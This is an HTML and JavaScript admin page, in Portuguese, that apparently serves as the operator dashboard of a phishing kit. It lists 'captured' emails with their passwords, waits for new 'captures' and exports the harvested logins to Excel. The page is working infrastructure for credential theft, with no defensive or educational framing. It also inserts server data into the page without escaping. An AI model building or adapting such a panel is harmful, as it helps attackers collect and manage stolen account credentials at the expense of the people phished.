<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Senior Admin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; }
        .card-admin { background: #1e293b; border: none; border-radius: 12px; }
        .table { color: #f8fafc; border-color: #334155; }
        .badge-email { background: #3b82f6; font-weight: 500; font-size: 0.9rem; }
        .btn-excel { background: #10b981; border: none; color: white; transition: 0.3s; }
        .btn-excel:hover { background: #059669; transform: translateY(-2px); }
    </style>
</head>
<body>

<div class="container py-5">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <h2 class="fw-bold text-primary"><i class="fas fa-terminal me-2"></i>Admin Panel</h2>
        <a href="/" class="btn btn-outline-light btn-sm">Sair</a>
    </div>

    <div class="mb-3 text-end">
        <a href="/exportar" class="btn btn-excel px-4 fw-bold shadow-sm">
            <i class="fas fa-file-excel me-2"></i> Exportar para Excel
        </a>
    </div>

    <div class="card card-admin p-4 shadow-lg">
        <div class="table-responsive">
            <table class="table table-hover align-middle">
                <thead>
                    <tr>
                        <th>Email Capturado</th>
                        <th>Senha</th>
                        <th class="text-center">Ação</th>
                    </tr>
                </thead>
                <tbody id="tabela-usuarios">
                    </tbody>
            </table>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script>
    async function carregarDados() {
        try {
            const res = await fetch('/api/usuarios');
            const dados = await res.json();
            const tabela = document.getElementById('tabela-usuarios');
            tabela.innerHTML = '';

            if (dados.length === 0) {
                tabela.innerHTML = '<tr><td colspan="3" class="text-center py-5 text-muted">Aguardando capturas...</td></tr>';
                return;
            }

            dados.forEach((u, index) => {
                tabela.innerHTML += `
                    <tr>
                        <td><span class="badge badge-email p-2 rounded-3">${u.email}</span></td>
                        <td class="text-muted small">••••••••</td>
                        <td class="text-center">
                            <button class="btn btn-outline-danger btn-sm" onclick="deletar(${index})">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `;
            });
        } catch (e) { console.error("Erro:", e); }
    }

    function deletar(id) {
        Swal.fire({
            title: 'Confirmar exclusão?',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#ef4444',
            confirmButtonText: 'Sim, deletar!',
            background: '#1e293b', color: '#fff'
        }).then((result) => {
            if (result.isConfirmed) window.location.href = `/deletar/${id}`;
        })
    }
    carregarDados();
</script>
</body>
</html>
